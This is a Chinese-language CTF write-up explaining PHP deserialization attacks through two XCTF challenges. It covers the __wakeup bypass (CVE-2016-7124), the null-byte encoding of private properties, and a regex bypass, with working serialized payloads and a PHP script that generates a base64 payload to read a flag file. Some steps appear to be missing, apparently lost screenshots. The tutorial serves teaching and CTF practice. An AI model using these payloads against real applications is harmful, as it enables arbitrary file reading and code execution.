0x01 利用方向

反序列化漏洞通常比较难以利用，但是一旦成功利用往往会造成较大的危害。同时反序列化漏洞往往不会单独利用，而是通过反序列化造成其他的漏洞。

比如对象中有方法会对文件进行读取，如果能通过反序列操控所要读取的文件名，就能够进行任意文件读取，造成敏感信息泄露。又比如对象中有方法会将成员变量带入数据库查询，如果能够通过反序列化操控要查询变量的值，就能够造成SQL注入。再比如对象中有像eval()或system()这一类的函数，并且函数中的变量可以通过反序列化控制，那么就会造成任意代码、命令执行的漏洞。
利用的方向并不是固定的，而是要结合程序的实际情况去判断如何利用。


0x02 利用实例

这里我们就以攻防世界中的两道题来演示反序列化漏洞的实际利用过程，来带大家感受一下反序列化漏洞的利用方法。

unserialize3解题思路

第一道题我们以web方向高手进阶区的unserialize3这一题为例：

进入场景后页面展示如下：
class xctf{public $flag = '111';public function __wakeup(){exit('bad requests');}?code=

我们逐行来看，首先是定义了一个类，类名为xctf，然后定义了一个成员变量$flag值为“111”。之后定义了一个魔术方法__wekup()，方法中的代码是exit('bad requests');最后一行的?code=应该是提示我们要提交的参数名。

上一篇文章中我们讲过在反序列化之前会检查类中是否有__wekup()函数，如果有则会先调用该函数，然后再进行反序列化。而exit()函数等价于die()函数，会停止程序运行并提示信息。

那么思路就很明显了，我们需要绕过__wekup()方法来执行反序列化。这涉及到一个php的漏洞。

__wakeup()绕过（CVE-2016-7124）
漏洞影响版本：

PHP5 < 5.6.25

PHP7 < 7.0.10

漏洞产生原因：
如果存在__wakeup方法，调用 unserilize() 方法前则先调用该方法。
但是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行 。
构造poc

我们先传入正常的序列化字符串查看结果：

<?phpclass xctf {    public $flag = '111';    }$x=serialize(new xctf);echo $x;?>

输出的序列化字符串为：

O:4:"xctf":1:{s:4:"flag";s:3:"111";}

构造payload：

http://220.249.52.133:32371/?code=O:4:%22xctf%22:1:{s:4:%22flag%22;s:3:%22111%22;}
页面结果如下：

发现__wakeup方法确实被调用了。我们利用上面提到的CVE-2016-7124

将成员变量改为大于实际值的数值，我们来将它改成2。

构造payload：

将序列化字符串改为：O:4:"xctf":2:{s:4:"flag";s:3:"111";}http://220.249.52.133:32371/?code=O:4:%22xctf%22:2:{s:4:%22flag%22;s:3:%22111%22;}

<?php class Demo {             #构造一个类，类名为Demo    private $file = 'index.php';    #定义一个成员变量，变量名为file,默认值为‘index.php’    public function __construct($file) {            $this->file = $file;         #创建对象时将$file的值赋给成员变量file    }    function __destruct() {         echo @highlight_file($this->file, true);   #销毁对象时高亮显现文件路径为成员变量file的值的文件    }    function __wakeup() {         if ($this->file != 'index.php') {  #反序列化之前检查成员变量file的值是否为‘index.php’            //the secret is in the fl4g.php  #这里提示秘密在“fl4g.php”文件中            $this->file = 'index.php';    #如果不是，将成员变量的值改为‘index.php’        }     } }if (isset($_GET['var'])) {         #判断，如果GET方式获取到‘var’参数    $var = base64_decode($_GET['var']);  #将获取到的‘var’参数值进行base64解密    if (preg_match('/[oc]:\d+:/i', $var)) {  #通过正则表达式匹配，匹配规则为“o或c”之后跟着“:任意位数字:”，不区分大小写        die('stop hacking!');     #如果匹配成功，停止程序运行，并提示“stop hacking！”    } else {        @unserialize($var);     #如果匹配失败，反序列化传入的字符串，@表示不提示错误    } } else {     highlight_file("index.php");  #如果没有获取到‘var’参数，则高亮显示“index.php”的代码。} ?>

这里就涉及到了一个成员变量的属性问题了。

成员变量的属性问题

访问控制修饰符的不同，序列化后属性的长度和属性值会有所不同，如下所示public(公有)protected(受保护)private(私有的)protected属性被序列化的时候属性值会变成 %00*%00属性名private属性被序列化的时候属性值会变成 %00类名%00属性名注：%00表示占用1个字符。

这里%00是一个不可打印的字符，同时我们复制粘贴时会破坏它，所以我们直接编写脚本将生成的序列化字符串直接进行base64加密，然后输出，防止我们复制时修改其中字符。

<?phpclass Demo{    private $file = 'fl4g.php';          }$y=serialize(new Demo); #创建一个对象并将其序列化$y=str_replace('O:4','O:+4',$y); #'O:4'替换为"O:+4"绕过正则表达式$y=str_replace(':1:',':2:',$y); #':1:'替换为':2:'绕过__wakeup方法echo($y);       #检查序列化字符串是否按照我们要求替换echo("</br>");$y=base64_encode($y);   #进行base64加密echo($y);   #输出加密后的字符串?>

运行结果如下：

O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==
我们可以看到成员变量名变成了Demofile，并且长度显示是10，长度肉眼来看并不匹配。

我们通过Burp进行base64解码来看，也可以发现“Demo”前后确实有00，也验证了我们之前的说法正确。

然后我们将生成的字符串提交来验证结果，构造payload如下：

0x03 小结

通过两道CTF题，我们简单理解了PHP反序列化漏洞的利用方法。大体的思路则是需要我们结合实际的代码来分析，哪个函数会影响程序的运行结果，哪个方法会在何时被调用，调用之后会对哪些变量造成影响。然后观察我们传入的序列化字符串能够影响到哪些变量，如何构造字符串才能让程序向我们想要的方向运行，经过精心的构造，才能够达到我们最终的目的。
